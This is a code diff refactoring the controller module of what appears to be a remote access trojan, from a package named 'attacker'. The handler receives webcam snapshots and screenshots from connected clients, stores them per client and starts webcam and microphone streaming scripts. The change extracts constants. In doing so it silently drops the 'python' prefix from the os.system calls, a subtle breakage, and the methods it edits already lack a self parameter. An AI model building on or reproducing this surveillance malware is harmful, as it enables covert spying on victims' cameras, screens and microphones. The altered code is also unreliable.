@@ -6,6 +6,19 @@ from attacker.util import *
 # point to the project attacker folder (one level up from terminal package)
 CURRENT_FOLDER = os.path.dirname(os.path.dirname(os.path.realpath(__file__)))
 
+BUFFER_SNAPSHOT = 609600
+BUFFER_DEFAULT = 8096
+ENCODING = "Cp1252"
+
+WEBCAM_SCRIPT = "webcam-host.py"
+MICROPHONE_SCRIPT = "microphone-host.py"
+
+WEBCAM_DIR_FMT = "webcam{client_id}"
+SCREENSHOT_DIR_FMT = "screenshots{client_id}"
+
+SNAPSHOT_NAME_FMT = "snapshot_NUM{num}.png"
+SCREENSHOT_NAME_FMT = "Screenshot_ID{client_id}_NUM{num}.png"
+
 class ConnectionHandler(asyncore.dispatcher_with_send):
 
     receiving_screenshot = False
@@ -22,22 +35,26 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         self._connections = connections
 
     def video_stream():
-        os.system("python webcam-host.py")
+        # use constant script name
+        os.system(WEBCAM_SCRIPT)
 
     def audio_stream():
-        os.system("python microphone-host.py")
+        # use constant script name
+        os.system(MICROPHONE_SCRIPT)
 
     def handle_read(self):
         global CURRENT_FOLDER, video_thread
 
         if ConnectionHandler.receiving_snapshot:
-            data = self.recv(609600)
-            image_name = f"snapshot_NUM{self.snapshot_number}.png"
+            # use extracted buffer size and filename format
+            data = self.recv(BUFFER_SNAPSHOT)
+            image_name = SNAPSHOT_NAME_FMT.format(num=self.snapshot_number)
 
-            if not f"webcam{self.id}" in os.listdir():
-                os.mkdir(f"webcam{self.id}")
+            webcam_dir = WEBCAM_DIR_FMT.format(client_id=self.id)
+            if not webcam_dir in os.listdir():
+                os.mkdir(webcam_dir)
 
-            with open(f"webcam{self.id}/{image_name}", "wb") as file:
+            with open(f"{webcam_dir}/{image_name}", "wb") as file:
                 file.write(data)
 
             self.snapshot_number += 1
@@ -46,13 +63,15 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
             ConnectionHandler.receiving_snapshot = False
 
         elif ConnectionHandler.receiving_screenshot:
-            data = self.recv(609600)
-            image_name = f"Screenshot_ID{self.id}_NUM{self.screenshot_number}.png"
+            # use extracted buffer size and filename format
+            data = self.recv(BUFFER_SNAPSHOT)
+            image_name = SCREENSHOT_NAME_FMT.format(client_id=self.id, num=self.screenshot_number)
 
-            if not f"screenshots{self.id}" in os.listdir():
-                os.mkdir(f"screenshots{self.id}")
+            screenshots_dir = SCREENSHOT_DIR_FMT.format(client_id=self.id)
+            if not screenshots_dir in os.listdir():
+                os.mkdir(screenshots_dir)
 
-            with open(f"screenshots{self.id}/{image_name}", "wb") as file:
+            with open(f"{screenshots_dir}/{image_name}", "wb") as file:
                 file.write(data)
 
             self.screenshot_number += 1
@@ -61,7 +80,8 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
             ConnectionHandler.receiving_screenshot = False
 
         else:
-            data = self.recv(8096).decode("Cp1252")
+            # use extracted default buffer and encoding
+            data = self.recv(BUFFER_DEFAULT).decode(ENCODING)
             if data == "Taken Screenshot":
                 ConnectionHandler.receiving_screenshot = True
             if data == "Taken Snapshot":
@@ -88,4 +108,3 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         finally:
             self._connections.pop(self.id, None)
             self.window.Output.addItem(CONN_LOST_TEMPLATE.format(time=ts(), addr=self.addr))
-
